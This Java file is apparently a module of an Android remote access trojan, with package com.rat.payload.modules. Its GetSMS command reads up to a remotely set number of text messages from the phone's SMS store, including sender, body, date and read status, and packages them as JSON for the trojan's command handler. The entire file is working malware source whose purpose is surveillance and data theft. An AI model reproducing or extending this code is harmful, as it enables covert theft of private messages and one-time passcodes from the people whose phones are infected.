package com.rat.payload.modules;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import org.json.JSONArray;
import org.json.JSONObject;

public class GetSMS implements CommandHandler.Command {

    private Context context;

    public GetSMS(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        JSONArray messages = new JSONArray();
        try {
            int limit = args.optInt("limit", 100);
            Uri uri = Uri.parse("content://sms/");
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, "date DESC LIMIT " + limit);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")));
                    messages.put(sms);
                }
                cursor.close();
            }
            result.put("messages", messages);
            result.put("count", messages.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
